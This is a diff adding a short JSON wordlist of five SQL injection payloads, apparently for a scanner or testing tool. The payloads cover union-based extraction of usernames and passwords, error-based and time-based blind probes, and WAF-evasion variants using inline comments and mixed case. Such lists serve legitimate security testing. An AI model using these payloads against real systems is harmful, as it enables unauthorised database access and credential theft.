@@ -1,0 +1,22 @@
+[
+    {
+        "type": "Union-Based",
+        "payload": "' UNION SELECT null, username, password FROM users--"
+    },
+    {
+        "type": "Error-Based",
+        "payload": "' OR 1=1 ORDER BY 100--"
+    },
+    {
+        "type": "Blind",
+        "payload": "' AND SLEEP(5)--"
+    },
+    {
+        "type": "WAF Bypass (comments)",
+        "payload": "'/**/UNION/**/SELECT/**/NULL--"
+    },
+    {
+        "type": "Case Variation",
+        "payload": "' uNIoN SeLEct null--"
+    }
+]
